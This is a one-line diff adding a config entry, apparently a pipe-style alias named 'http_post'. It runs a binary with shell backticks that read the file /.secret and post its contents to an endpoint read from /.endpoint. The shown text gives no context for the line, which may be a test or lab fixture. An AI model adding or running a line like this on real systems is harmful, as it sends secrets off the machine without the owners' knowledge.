@@ -1,0 +1,1 @@
+http_post: "|/usr/local/bin/http_post -s `cat /.secret` `cat /.endpoint`"
